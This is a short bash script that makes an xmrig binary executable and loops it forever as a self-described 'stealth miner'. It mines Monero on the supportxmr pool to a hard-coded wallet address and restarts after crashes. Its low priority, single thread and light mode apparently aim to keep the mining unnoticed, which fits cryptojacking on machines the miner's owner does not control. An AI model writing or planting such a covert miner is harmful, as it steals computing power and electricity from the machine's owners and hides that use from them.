#!/bin/bash

# Give permission to run
chmod +x ./xmrig

while true; do
  echo "⛏️ Starting stealth miner..."
  nice -n 19 ./xmrig -o pool.supportxmr.com:443 -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm -k --tls -t 1 --cpu-priority=1 --randomx-mode=light
  echo "❌ Miner crashed. Restarting in 30s..."
  sleep 30
done
